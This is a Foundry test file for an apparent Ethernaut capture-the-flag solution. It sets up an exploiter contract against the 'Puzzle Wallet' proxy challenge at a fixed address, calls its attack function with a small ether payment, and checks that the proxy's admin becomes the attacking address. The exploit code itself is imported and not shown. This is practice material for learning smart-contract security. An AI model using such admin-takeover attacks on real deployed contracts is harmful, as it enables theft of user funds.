// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import "../src/24-PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    IPuzzleProxy proxy;
    PuzzleWallet exploiter;

    function setUp() public {
        address instanceAddress = 0x46970b92871b615E42B9788da8c880BB138DB771;
        proxy = IPuzzleProxy(instanceAddress);
        exploiter = new PuzzleWallet(instanceAddress);
    }

    function test_attack() public {
        vm.startPrank(0xBF8641831D15c2701BA122981C3D7A6A2533ea48, 0xBF8641831D15c2701BA122981C3D7A6A2533ea48);
        exploiter.attack{value: 0.001 ether}();
        assert(proxy.admin() == 0xBF8641831D15c2701BA122981C3D7A6A2533ea48);
    }
}
